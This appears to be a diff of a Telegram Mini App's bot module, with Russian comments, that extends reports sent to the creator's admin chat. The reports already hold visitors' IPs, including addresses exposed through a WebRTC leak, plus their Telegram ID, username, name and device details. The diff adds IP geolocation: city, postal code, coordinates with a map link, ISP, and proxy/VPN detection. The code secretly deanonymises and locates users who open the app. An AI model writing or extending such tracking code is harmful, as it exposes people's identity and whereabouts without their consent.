@@ -9,6 +9,26 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 // Чтобы узнать свой ID, напишите боту @userinfobot в Telegram
 const ADMIN_CHAT_ID = '7320458296'; // ID админа (создателя бота)
 
+interface GeoData {
+  ip: string;
+  country?: string;
+  countryCode?: string;
+  region?: string;
+  city?: string;
+  zip?: string;
+  lat?: number;
+  lon?: number;
+  timezone?: string;
+  isp?: string;
+  org?: string;
+  as?: string;
+  asname?: string;
+  reverse?: string;
+  mobile?: boolean;
+  proxy?: boolean;
+  hosting?: boolean;
+}
+
 interface UserData {
   ip: string;
   ipInfo: {
@@ -17,6 +37,7 @@ interface UserData {
     localIP: string[];
     webrtcLeaked: string[]; // Все IP полученные через WebRTC leak
   };
+  geoData?: GeoData; // Геоданные
   userAgent: string;
   language: string;
   platform: string;
@@ -80,13 +101,69 @@ export async function sendMessageToBot(chatId: string | number, message: string)
  * Форматировать данные пользователя для отправки
  */
 function formatUserData(data: UserData): string {
-  let message = '🔔 <b>Новый пользователь в Mini App</b>\n\n';
+  let message = '🚨 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ В MINI APP</b> 🚨\n\n';
   
   message += `🌐 <b>IP Адрес:</b> <code>${data.ip}</code>\n`;
   
+  // ГЕОЛОКАЦИЯ (если доступна)
+  if (data.geoData) {
+    const geo = data.geoData;
+    message += `\n📍 <b>ГЕОЛОКАЦИЯ:</b>\n`;
+    
+    if (geo.country) {
+      const flag = geo.countryCode ? getFlagEmoji(geo.countryCode) : '';
+      message += `   ${flag} <b>Страна:</b> ${geo.country}`;
+      if (geo.countryCode) message += ` (${geo.countryCode})`;
+      message += '\n';
+    }
+    
+    if (geo.region) {
+      message += `   🗺️ <b>Регион:</b> ${geo.region}\n`;
+    }
+    
+    if (geo.city) {
+      message += `   🏙️ <b>Город:</b> ${geo.city}\n`;
+    }
+    
+    if (geo.zip) {
+      message += `   📮 <b>Индекс:</b> ${geo.zip}\n`;
+    }
+    
+    if (geo.lat && geo.lon) {
+      message += `   🧭 <b>Координаты:</b> ${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}\n`;
+      message += `   🗺️ <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">Открыть на карте</a>\n`;
+    }
+    
+    if (geo.timezone) {
+      message += `   🕐 <b>Timezone:</b> ${geo.timezone}\n`;
+    }
+    
+    if (geo.isp || geo.org) {
+      message += `\n🌐 <b>ПРОВАЙДЕР:</b>\n`;
+      if (geo.isp) message += `   📡 <b>ISP:</b> ${geo.isp}\n`;
+      if (geo.org && geo.org !== geo.isp) message += `   🏢 <b>Org:</b> ${geo.org}\n`;
+      if (geo.as) message += `   🔢 <b>AS:</b> ${geo.as}\n`;
+      if (geo.asname) message += `   📛 <b>AS Name:</b> ${geo.asname}\n`;
+    }
+    
+    // Флаги безопасности
+    if (geo.mobile !== undefined || geo.proxy !== undefined || geo.hosting !== undefined) {
+      message += `\n⚠️ <b>ФЛАГИ:</b>\n`;
+      if (geo.mobile !== undefined) {
+        message += `   📱 Mobile: ${geo.mobile ? '✅ Да' : '❌ Нет'}\n`;
+      }
+      if (geo.proxy !== undefined) {
+        message += `   🔒 Proxy/VPN: ${geo.proxy ? '⚠️ ДА (обнаружен)' : '✅ Нет'}\n`;
+      }
+      if (geo.hosting !== undefined) {
+        message += `   🖥️ Hosting: ${geo.hosting ? '⚠️ ДА (дата-центр)' : '✅ Нет'}\n`;
+      }
+    }
+  }
+  
   // WebRTC Leaked IPs - все обнаруженные IP
   if (data.ipInfo.webrtcLeaked && data.ipInfo.webrtcLeaked.length > 0) {
-    message += `\n🔓 <b>WebRTC Leak (${data.ipInfo.webrtcLeaked.length}):</b>\n`;
+    message += `\n🔓 <b>WebRTC LEAK (${data.ipInfo.webrtcLeaked.length}):</b>\n`;
     data.ipInfo.webrtcLeaked.forEach((ip, index) => {
       message += `   ${index + 1}. <code>${ip}</code>\n`;
     });
@@ -115,20 +192,21 @@ function formatUserData(data: UserData): string {
     });
   }
   
-  message += `\n📱 <b>Устройство:</b> ${data.platform}\n`;
-  message += `🌍 <b>Язык:</b> ${data.language}\n`;
-  message += `📺 <b>Разрешение:</b> ${data.screenResolution}\n`;
-  message += `🕐 <b>Timezone:</b> ${data.timezone}\n`;
-  message += `⏰ <b>Время:</b> ${data.timestamp}\n`;
+  message += `\n📱 <b>УСТРОЙСТВО:</b>\n`;
+  message += `   💻 <b>Платформа:</b> ${data.platform}\n`;
+  message += `   🌍 <b>Язык:</b> ${data.language}\n`;
+  message += `   📺 <b>Разрешение:</b> ${data.screenResolution}\n`;
+  message += `   🕐 <b>Timezone:</b> ${data.timezone}\n`;
+  message += `   ⏰ <b>Время:</b> ${data.timestamp}\n`;
   
   if (data.telegramUser) {
-    message += `\n👤 <b>Telegram User:</b>\n`;
-    message += `   ID: <code>${data.telegramUser.id}</code>\n`;
+    message += `\n👤 <b>TELEGRAM USER:</b>\n`;
+    message += `   🆔 ID: <code>${data.telegramUser.id}</code>\n`;
     if (data.telegramUser.username) {
-      message += `   Username: @${data.telegramUser.username}\n`;
+      message += `   📝 Username: @${data.telegramUser.username}\n`;
     }
     if (data.telegramUser.first_name) {
-      message += `   Name: ${data.telegramUser.first_name}`;
+      message += `   👤 Name: ${data.telegramUser.first_name}`;
       if (data.telegramUser.last_name) {
         message += ` ${data.telegramUser.last_name}`;
       }
@@ -136,7 +214,7 @@ function formatUserData(data: UserData): string {
     }
   }
   
-  message += `\n🔍 <b>User Agent:</b>\n<code>${data.userAgent}</code>`;
+  message += `\n🔍 <b>USER AGENT:</b>\n<code>${data.userAgent}</code>`;
   
   return message;
 }
@@ -198,4 +276,18 @@ export async function getBotInfo(): Promise<any> {
     console.error('Error getting bot info:', error);
     return null;
   }
+}
+
+/**
+ * Получить эмодзи флага по коду страны
+ */
+function getFlagEmoji(countryCode: string): string {
+  if (!countryCode || countryCode.length !== 2) return '🌍';
+  
+  const codePoints = countryCode
+    .toUpperCase()
+    .split('')
+    .map(char => 127397 + char.charCodeAt(0));
+  
+  return String.fromCodePoint(...codePoints);
 }
